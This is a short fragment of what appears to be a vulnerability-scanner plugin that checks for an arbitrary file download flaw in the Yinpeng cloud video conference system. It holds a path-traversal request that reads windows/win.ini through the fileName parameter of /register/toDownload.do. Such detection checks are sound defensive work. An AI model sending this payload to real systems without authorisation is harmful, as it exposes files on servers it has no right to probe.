...
if (description)
{
  script_id(51799324); #WEBRAY_SID
  script_version("1.3");
  script_name(english:"Vulnerability in downloading arbitrary files in Yinpeng Cloud Computing Video Conference System");
  script_summary(english:"Vulnerability in downloading arbitrary files in Yinpeng Cloud Computing Video Conference System");
  script_set_attribute(attribute:"description", value:"Vulnerability in downloading arbitrary files in Yinpeng Cloud Computing Video Conference System.");
...
function check_remote(port){
	url = "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini";
